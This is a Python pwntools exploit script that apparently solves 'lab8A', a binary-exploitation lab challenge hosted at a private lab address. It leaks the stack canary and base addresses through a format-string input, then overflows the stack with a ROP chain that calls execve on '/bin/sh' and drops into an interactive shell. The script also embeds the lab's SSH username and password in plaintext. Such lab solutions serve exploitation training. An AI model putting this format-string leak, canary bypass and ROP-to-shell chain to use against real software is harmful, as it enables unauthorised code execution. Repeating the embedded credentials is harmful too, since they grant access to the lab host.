#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 172.17.18.73 --user lab8A --pass 'Th@t_w@5_my_f@v0r1t3_ch@11' --path /levels/lab08/lab8A
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('lab8A')
context.terminal     = '/bin/bash'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '172.17.18.73'
port = int(args.PORT or 22)
user = args.USER or 'lab8A'
password = args.PASSWORD or 'Th@t_w@5_my_f@v0r1t3_ch@11'
remote_path = '/levels/lab08/lab8A'

# Connect to the remote SSH server
#shell = None
#if not args.LOCAL:
#    shell = ssh(user, host, port, password)
#    shell.set_working_directory(symlink=True)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        #return shell.process([remote_path] + argv, *a, **kw)
        return connect(host,port)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

EIP_OFFSET   = 0x11da

POP_ECX      = 0x9f1c5
POP_EBX_EDX  = 0x27229
POP_EAX      = 0x74506
SYSCALL      = 0xef6

io = start()

p = log.progress("leaking stack canary, text_base, and buf_base: ")
io.sendlineafter("Enter Your Favorite Author's Last Name:", "%130$08x.%132$08x.%131$08x")
stack_canary = int(io.readuntil(".", drop=True).strip(), 16)
text_base = int(io.readuntil(".", drop=True), 16) - EIP_OFFSET
buf_base = int(io.readline().strip(), 16)
p.success(hex(stack_canary) + " " + hex(text_base) + hex(buf_base))


p = log.progress("smashing stack w/ stack canary intact: ")
io.sendlineafter("What were you thinking, that isn't a good book.", "A")
io.sendlineafter("..I like to read ^_^ <== ", 'A' * 16 + '\xef\xbe\xad\xde' + 'POOP' +
                                                p32(stack_canary) + 'POOP' + 
                                                p32(POP_ECX+text_base) + p32(0) +
                                                p32(POP_EBX_EDX+text_base) + p32(buf_base) + p32(0) +
                                                p32(POP_EAX+text_base) + p32(0xb) +
                                                p32(SYSCALL+text_base) + "/bin/sh\x00" )
                                                
                                                
p.success("done!")


# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

